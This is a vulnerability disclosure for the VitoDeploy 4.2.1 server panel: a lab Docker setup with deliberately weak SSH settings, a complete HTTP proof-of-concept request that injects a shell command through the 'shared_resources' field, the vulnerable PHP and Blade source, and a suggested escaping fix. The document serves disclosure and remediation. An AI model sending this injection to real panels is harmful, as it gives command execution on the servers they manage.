### Vulnerability details

**Official website / Product:** https://vitodeploy.com / https://github.com/vitodeploy/vito

**Repository:** vitodeploy/vito (stars at selection: 3260)

**Vulnerability type:** RCE (OS command injection via SSH script interpolation)

**Vulnerability versions:** 4.2.1 (image `vitodeploy/vito:4.2.1`; source tag/commit `4.2.1` / `25798391a19cad2d42d495657d74da427f6e48d8`); modern-deployment enable/configure/link-resources blades unchanged on audited HEAD

**Vulnerability URL / Parameter:** `POST /servers/{server}/sites/{site}/features/modern-deployment/enable` — JSON/form field `shared_resources` (also persisted via `configuration` and reused on deploy in `link-resources`)

**Complex:** yes

### Verification procedure

1. Bring up official panel image `vitodeploy/vito:4.2.1` (host **18806→80**) plus a managed SSH target (Ubuntu 24.04 + openssh-server; host **18822→22**; compose-network IP ~`172.18.0.2`). Panel container `vito-r8a6`; SSH image/container `vito-r8a6-ssh-target` / `vito-r8a6-ssh`. The original `labs/vito-r8a6` tree may be gone; rebuild with the files below, then `docker compose up -d --build`:

```dockerfile
# Dockerfile (image name vito-r8a6-ssh-target)
FROM ubuntu:24.04
RUN apt-get update && apt-get install -y openssh-server sudo curl ca-certificates \
 && mkdir -p /var/run/sshd /root/.ssh \
 && echo 'root:root' | chpasswd \
 && sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config \
 && sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config \
 && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config \
 && echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config
CMD ["/usr/sbin/sshd", "-D"]
```

```yaml
# docker-compose.yml (prefer project dir name vito-r8a6 so network/volume prefixes are vito-r8a6_*)
services:
  vito:
    image: vitodeploy/vito:4.2.1
    container_name: vito-r8a6
    ports:
      - "18806:80"
    environment:
      APP_KEY: "PleaseChangeThisToASecretKey32"
      NAME: "vito"
      EMAIL: "vito@example.com"
      PASSWORD: "password"
      APP_URL: "http://127.0.0.1:18806"
    volumes:
      - vito-r8a6-storage:/var/www/html/storage
    networks: [vito-r8a6]
  ssh:
    build: .
    image: vito-r8a6-ssh-target
    container_name: vito-r8a6-ssh
    ports:
      - "18822:22"
    networks: [vito-r8a6]
networks:
  vito-r8a6:
volumes:
  vito-r8a6-storage:
```

Expected `docker ps` topology:

```
NAMES           IMAGE                   PORTS
vito-r8a6       vitodeploy/vito:4.2.1   0.0.0.0:18806->80/tcp
vito-r8a6-ssh   vito-r8a6-ssh-target    0.0.0.0:18822->22/tcp
```

2. After panel bootstrap, log in as `vito@example.com` / `password` (Laravel session + XSRF). The PoC `Cookie` / `X-XSRF-TOKEN` values are from that session; re-login and refresh them if expired.
3. Ensure a READY custom server + Laravel site `example.test` exist and the panel can SSH to the managed host as site user `vito` (lab pre-trusted the Vito key; target compose-network IP ~`172.18.0.2`).
4. `POST` modern-deployment **enable** for server=1 / site=1 with JSON:
   `shared_resources=.env,x; touch /tmp/vito-rce-http; #` and `history=10` (full message below).
5. Observe HTTP **302** back to the features page; confirm the injected command on the SSH target:
   `docker exec vito-r8a6-ssh ls -la /tmp/vito-rce-http`
   → `-rw-rw-r-- 1 vito vito 0 Nov  1 12:26 /tmp/vito-rce-http`

### Complete vulnerability PoC

Full HTTP request (Docker-measured):

```http
POST /servers/1/sites/1/features/modern-deployment/enable HTTP/1.1
Host: 127.0.0.1:18806
Content-Type: application/json
Accept: text/html, application/xhtml+xml
X-Requested-With: XMLHttpRequest
X-Inertia: true
X-Inertia-Version: 0b4a12d5853afc9f92c6bc5576f9e21b
X-XSRF-TOKEN: eyJpdiI6Ill0dEJDVTNLUzJzMmhFd3A0aEl3WGc9PSIsInZhbHVlIjoiVW1ZYWUvaHZtWmJFcWRZbmdDalNaYW5aT0dWb0VFVUF2aStWOXNGMkxuMlhyTG8xMXZWOFltb21lM1VVd1lySVU4aThYdXlxOHNHSGZCb0NRbk43b0ZMbmtvck1vTVZhWnBUYTgzWHFLY0JNZ0toRFFST0M4YVV2UkFaTjJJVnciLCJtYWMiOiI4ZWJlOTExZWViNWI3ZDY2NjkxMjBiOWEyNTE2M2E0YzdjZmI4YWJmMmU2NDQyOGY4YmNlYzllZDRkNDAwOTBjIiwidGFnIjoiIn0=
Referer: http://127.0.0.1:18806/servers/1/sites/1/features
Cookie: XSRF-TOKEN=eyJpdiI6Ill0dEJDVTNLUzJzMmhFd3A0aEl3WGc9PSIsInZhbHVlIjoiVW1ZYWUvaHZtWmJFcWRZbmdDalNaYW5aT0dWb0VFVUF2aStWOXNGMkxuMlhyTG8xMXZWOFltb21lM1VVd1lySVU4aThYdXlxOHNHSGZCb0NRbk43b0ZMbmtvck1vTVZhWnBUYTgzWHFLY0JNZ0toRFFST0M4YVV2UkFaTjJJVnciLCJtYWMiOiI4ZWJlOTExZWViNWI3ZDY2NjkxMjBiOWEyNTE2M2E0YzdjZmI4YWJmMmU2NDQyOGY4YmNlYzllZDRkNDAwOTBjIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjNUMStMQkxLa1Npb0JjSWRSU1gwOGc9PSIsInZhbHVlIjoiUGhhbldCUEQxQU1waS9Jc20zVDUreDEzeTVaWTMyYWxwWjZ0NkFhZHNYcDFMWC9Xd0dicThIM3BNdmFMWlloemdjbkw3bGNxbTBjdWpmY2hoVi95NnloNVZCWkVJVTZtb0o0NXNrMjM3ZGlMak1kdStpSXROaU5zVEFwMzlnU3MiLCJtYWMiOiI2OTg5MWI2ZmM3N2UwYmNmYThjZDY3NWM1NjM4YzlhM2JjMGM4NzJlMjJhYjA3ODI4MmY3MTQ2ZDM1OTU2MDUyIiwidGFnIjoiIn0%3D
Content-Length: 71

{"shared_resources":".env,x; touch /tmp/vito-rce-http; #","history":10}
```

Full HTTP response (Docker-measured raw response):

```http
HTTP/1.1 302 Found
Server: nginx/1.24.0 (Ubuntu)
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Cache-Control: no-cache, private
Date: Sun, 01 Nov 2026 12:26:18 GMT
Location: http://127.0.0.1:18806/servers/1/sites/1/features
Vary: X-Inertia
Set-Cookie: XSRF-TOKEN=eyJpdiI6ImE2OCtCSzYzckhhbzV4RDFMeWIzSHc9PSIsInZhbHVlIjoidzgvSk1KYndmQ0J1Uy92bTRzVkhkaWFTSTlQankvbUk5VSt1S2s0d1VNT3BrMG9VY2dhRm1lVzBYL3VhN3d4YWVoOFZEa3ZsN2VQc1hWUlplYnFCRThodlJSemNBZnlUUDBtWGdIc2svSXZ1N05FRXhYL3FpMGQzbFk4ZmFpOEUiLCJtYWMiOiIwOWZkZjQ0NGEyMDY4ODRmZjM5ZmI1ZTc1MzNmYWM0MjllODRkZjk1M2RmOTcwYTFkNzkwNGQzNjgwMTYxZDVlIiwidGFnIjoiIn0%3D; expires=Sun, 01 Nov 2026 14:26:18 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6ImFpcmdQNmtscjhGMmo4Q25KdC96OEE9PSIsInZhbHVlIjoiWW16ajlrNStWbzkzSHMxMk0vSFE0eGpRZm5pbk9tSzA4aHRUV2x1MGNpaG9sM0NscFJaZ3IxREduT3oyWDRGMDh5c1VJTFZkVU5PYXovL2Z3R2hDVXdrK2pGRldlbGN2aVhVdGRzd0lhOFFMSlphL1JxTkZXWDU2ZTVFVndyenEiLCJtYWMiOiI3MmY4NWI1NmFlNjVhZTRhMDE5YzE5M2JjNzUyNjZjMzJhMTNmZDVhOGEwNmEzZGE2YjgxNmM5ZTEwZTQwMWY0IiwidGFnIjoiIn0%3D; expires=Sun, 01 Nov 2026 14:26:18 GMT; Max-Age=7200; path=/; httponly; samesite=lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='http://127.0.0.1:18806/servers/1/sites/1/features'" />

        <title>Redirecting to http://127.0.0.1:18806/servers/1/sites/1/features</title>
    </head>
    <body>
        Redirecting to <a href="http://127.0.0.1:18806/servers/1/sites/1/features">http://127.0.0.1:18806/servers/1/sites/1/features</a>.
    </body>
</html>
```

Managed-host impact proof (`docker exec vito-r8a6-ssh ls -la /tmp/vito-rce-http`):

```
-rw-rw-r-- 1 vito vito 0 Nov  1 12:26 /tmp/vito-rce-http
```

Verification result:

HTTP 302 confirms the enable action completed. On the managed SSH host: `-rw-rw-r-- 1 vito vito 0 Nov  1 12:26 /tmp/vito-rce-http` — created by the injected `touch` in `shared_resources` as site user `vito`.

### Vulnerability analysis

Modern Deployment’s Enable handler accepts `shared_resources` as a free-form string (`string|nullable`), splits on commas, passes the array into Blade SSH templates, and stores the same array in `type_data.modern_deployment_shared_resources`. Those templates interpolate each resource with Blade `{{ }}` (HTML escaping only) into unquoted shell words:

`rm -rf {base}/releases/initial/{resource}` and `ln -sfn .../{resource}`.

HTML escaping does **not** neutralize shell metacharacters such as `;`, `|`, `$()`, or backticks. A value like `x; touch /tmp/vito-rce-http; #` therefore terminates the `rm`/`ln` command and runs attacker-controlled commands over the authenticated SSH session as the site user. Later deploys reuse the persisted list via `link-resources.blade.php` with the same unescaped interpolation; `git pull origin {{ $site->branch }}` in that template is a related weak interpolation (branch is only validated as `required`). `Configuration.php` keeps the same `string|nullable` rules and can re-persist a malicious list.

This is **not** the intentional deploy-script/console feature: operators are expected to supply path names (`.env`, `storage`), not shell.

Vulnerable trigger / sink source (complete path and line numbers, tag 4.2.1):

```php
# File: app/SiteFeatures/ModernDeployment/Enable.php
# Lines: 59-93 (handle + validate)
    public function handle(Request $request): void
    {
        $this->validate($request);

        $this->ssh = $this->site->server->ssh($this->site->user);

        $sharedResources = explode(',', trim($request->input('shared_resources')));

        $this->ssh->exec(view('ssh.modern-deployment.enable', [
            'site' => $this->site,
            'sharedResources' => $sharedResources,
        ]), 'enable-modern-deployment', $this->site->id);

        $typeData = $this->site->type_data;
        $typeData['modern_deployment'] = true;
        $typeData['modern_deployment_shared_resources'] = $sharedResources;
        $typeData['modern_deployment_history'] = (int) $request->input('history');
        unset($typeData['env_path']);
        $this->site->type_data = $typeData;
        $this->site->path = $this->site->path.'/current';
        $this->site->save();
        // ... ensureDeploymentScriptsExist / updateVHost / flash ...
    }

    private function validate(Request $request): void
    {
        Validator::make($request->all(), [
            'shared_resources' => ['string', 'nullable'],
            'history' => ['required', 'integer', 'min:1'],
        ])->validate();
    }
```

```blade
# File: resources/views/ssh/modern-deployment/enable.blade.php
# Lines: 11-16
@if (count($sharedResources) > 0)
    @foreach ($sharedResources as $resource)
        rm -rf {{ $site->basePath() }}/releases/initial/{{ $resource }}
        ln -sfn {{ $site->basePath() }}/source/{{ $resource }} {{ $site->basePath() }}/releases/initial/{{ $resource }}
        echo "{{ $resource }} linked"
    @endforeach
@endif
```

```blade
# File: resources/views/ssh/modern-deployment/link-resources.blade.php
# Lines: 1-13 (deploy reuse of type_data; branch also weakly interpolated)
@php($sharedResources = data_get($site->type_data, 'modern_deployment_shared_resources', []))

cd {{ $site->basePath() }}/source
git stash
git clean -f
git pull origin {{ $site->branch }}

@if (count($sharedResources) > 0)
    @foreach ($sharedResources as $resource)
        rm -rf {{ $releasePath }}/{{ $resource }}
        ln -sfn {{ $site->basePath() }}/source/{{ $resource }} {{ $releasePath }}/{{ $resource }}
        echo "{{ $resource }} linked"
    @endforeach
@endif
```

```php
# File: app/SiteFeatures/ModernDeployment/Configuration.php
# validate — same weak rules as Enable; can re-persist a malicious list
        Validator::make($request->all(), [
            'shared_resources' => ['string', 'nullable'],
            'history' => ['required', 'integer', 'min:1'],
        ])->validate();
```

### Vulnerability Fix

Validate each shared resource as a relative path segment (reject `;|&$\`\n`, `..`, absolute paths). Pass through `escapeshellarg()` (or equivalent) before Blade interpolation, consistent with `app/SSH/OS/Git.php`. Apply the same hardening to `Configuration.php` persistence and `link-resources.blade.php` (including `branch`).
